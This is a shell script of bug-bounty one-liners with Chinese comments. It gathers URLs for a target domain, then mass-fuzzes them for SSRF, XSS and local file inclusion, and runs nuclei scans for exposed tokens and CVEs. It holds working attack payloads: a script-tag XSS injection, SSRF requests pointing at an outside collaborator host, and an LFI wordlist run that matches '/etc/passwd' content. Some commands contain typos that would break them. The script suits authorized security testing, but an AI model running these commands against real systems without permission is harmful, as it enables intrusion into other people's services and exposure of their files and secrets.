#!/bin/bash
# 收集uri并制作fuzz字典
gau -subs example.com >> vul1.txt
waybackurls example.com >> vul2.txt
subfinder -d example.com -silent | waybackurls >> vul3.txt
cat vul1.txt vuln2.txt vul3.txt | grep “=” | sort -u | grep “?” | httpx -silent >> FUZZvul.txt
# ssrf fuzz 使用httpx指定burp代理
xargs -a /root/magicparameter/ssrf.txt -I@ bash -c ‘for url in $(cat FUZZvul.txt); do echo “$url&@=http://burpcollabrator.net”;done’ | httpx -http-proxy http://127.0.0.1:8080
# nuclei扫描
# 使用nuclei提取页面token
cat urls.txt | assestfinder | httprobe | gauplus | nuclei -t exposures/tokens/
nuclei -u URL -t headless/extract-url.yaml -headless -silent | grep "^http" | nuclei -t exposures/tokens/
shodan domain DOMAIN TO BOUNTY | awk '{print $3}' | httpx -silent | nuclei -t /nuclei-templates/
cat list | nuclei -t nuclei-templates/{files,cves,tokens} -v -o result
# 使用gau、waybackurls、gf、httpx、ffuf批量挖掘xss、lfi、ssrf等
# XSS
cat file.txt | gf xss | grep ‘source=’ | qsreplace ‘”><script>confirm(1)</script>’ | while read host do ; do curl –silent –path-as-is –insecure “$host” | grep -qs “<script>confirm(1)” && echo “$host 33[0;31mVulnerablen”;done

# SSRF
findomain -t example.com -q | httpx -silent -threads 1000 | gau |  grep “=” | qsreplace http://YOUR.burpcollaborator.net

# LFI
findomain -t example.com -q |  waybackurls |gf lfi | qsreplace FUZZ | while read url ; do ffuf -u $url -mr “root:x” -w ~/wordlist/LFI.txt ; done

# 利用Idea 自带的 Jar 反编译工具
java -Xmx7066M -cp "/Applications/IntelliJ IDEA.app/Contents/plugins/java-decompiler/lib/java-decompiler.jar" org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -mpm=3 ./lib/openam* ./lib-decompiled
